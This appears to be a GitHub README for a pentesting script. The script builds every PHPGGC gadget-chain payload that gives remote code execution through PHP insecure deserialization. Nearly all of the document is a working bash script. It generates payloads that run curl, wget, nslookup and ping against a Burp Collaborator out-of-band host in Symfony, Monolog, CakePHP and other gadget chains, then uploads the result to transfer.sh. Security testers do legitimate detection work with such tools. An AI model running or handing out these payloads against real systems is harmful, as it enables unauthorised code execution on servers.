# PHP Insecure Deserialization
<img width="1005" alt="1" src="https://github.com/nowak0x01/php-insecure-deserialization/assets/96009982/0a6dd4bb-1716-4c41-ace3-3fd7b263191d"><br><br>

# PHPGGC Auto Generate Gadget Chains Payloads
This script automatically generates all payloads of gadgets available in PHPGGC https://github.com/ambionics/phpggc that lead to Remote code execution (RCE), using Out of Band techniques and phpinfo()<br><br>
Note: If the vector where you think you have insecure deserialization is not detected by the script, it does not mean it is safe, the script is just an automation<br><br>
You can encode the payloads using Burp Intruder rules or directly editing the script through phpggc

```C
sudo docker run --rm debian /bin/bash -c '

Collaborator="bvfczewt07rsrx2gt1k2tourpiv9j07p.oastify.com"

export TERM="xterm"
clear
apt update; apt install git curl php -y
clear
printf "\n\e[1;37m[#]\e[0m Downloading PHPGGC \e[1;37m[#]\e[0m\n"
git clone https://github.com/ambionics/phpggc && cd ./phpggc

printf "\n\e[1;37m[#]\e[0m Building Payloads (slow) \e[1;37m[#]\e[0m\n"

for _gadget in $(./phpggc -l 2>&- | grep "RCE: Command" | awk "{print \$1}" | grep -vE "Symfony\/RCE6|Symfony\/RCE1|Monolog\/RCE4|CakePHP\/RCE1");do

    printf "\n[+] Building Gadget: $_gadget [+]"

    sub=$(printf $_gadget | sed s/"\/"/"_"/g);
    ./phpggc -f $_gadget phpinfo "1" 2>&- >> gadgets.inc

    ./phpggc -f $_gadget system "curl curl_$sub.system.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget exec "curl curl_$sub.exec.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget passthru "curl curl_$sub.passthru.$Collaborator" 2>&- >> gadgets.inc

    ./phpggc -f $_gadget system "wget wget_$sub.system.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget exec "wget wget_$sub.exec.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget passthru "wget wget_$sub.passthru.$Collaborator" 2>&- >> gadgets.inc

    ./phpggc -f $_gadget system "nslookup nslookup_$sub.system.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget exec "nslookup nslookup_$sub.exec.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget passthru "nslookup nslookup_$sub.passthru.$Collaborator" 2>&- >> gadgets.inc

    ./phpggc -f $_gadget system "ping ping_$sub.system.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget exec "ping ping_$sub.exec.$Collaborator" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget passthru "ping ping_$sub.passthru.$Collaborator" 2>&- >> gadgets.inc

done

./phpggc -f Symfony/RCE6 "curl curl_Symfony_RCE6.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Symfony/RCE6 "wget wget_Symfony_RCE6.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Symfony/RCE6 "nslookup nslookup_Symfony_RCE6.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Symfony/RCE6 "ping ping_Symfony_RCE6.$Collaborator" 2>&- >> gadgets.inc

./phpggc -f Symfony/RCE1 "curl curl_Symfony_RCE1.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Symfony/RCE1 "wget wget_Symfony_RCE1.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Symfony/RCE1 "nslookup nslookup_Symfony_RCE1.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Symfony/RCE1 "ping ping_Symfony_RCE1.$Collaborator" 2>&- >> gadgets.inc

./phpggc -f Monolog/RCE4 "curl curl_Monolog_RCE4.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Monolog/RCE4 "wget wget_Monolog_RCE4.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Monolog/RCE4 "nslookup nslookup_Monolog_RCE4.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f Monolog/RCE4 "ping ping_Monolog_RCE4.$Collaborator" 2>&- >> gadgets.inc

./phpggc -f CakePHP/RCE1 "curl curl_CakePHP_RCE1.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f CakePHP/RCE1 "wget wget_CakePHP_RCE1.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f CakePHP/RCE1 "nslookup nslookup_CakePHP_RCE1.$Collaborator" 2>&- >> gadgets.inc
./phpggc -f CakePHP/RCE1 "ping ping_CakePHP_RCE1.$Collaborator" 2>&- >> gadgets.inc


for _gadget in $(./phpggc -l | grep "RCE: PHP Code" | awk "{print \$1}");do

    printf "\n[+] Building Gadget: $_gadget [+]"

    sub=$(printf $_gadget | sed s/"\/"/"_"/g);
    ./phpggc -f $_gadget "phpinfo();" 2>&- >> gadgets.inc

    ./phpggc -f $_gadget "system(\"curl curl_$sub.system.$Collaborator\");" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget "exec(\"curl curl_$sub.exec.$Collaborator\");" 2>&- >> gadgets.inc
    ./phpggc -f $_gadget "passthru(\"curl curl_$sub.passthru.$Collaborator\");" 2>&- >> gadgets.inc
done

file=$(tr -dc 'A-Z0-9' </dev/urandom | head -c 20)
sort -u gadgets.inc > $file
printf "\n\n\e[1;37m[+] The payloads have been uploaded [+]\n"
printf "U can download the file through that link: "; curl -Lsk --upload-file $PWD/$file https://transfer.sh/$file
echo
'
```
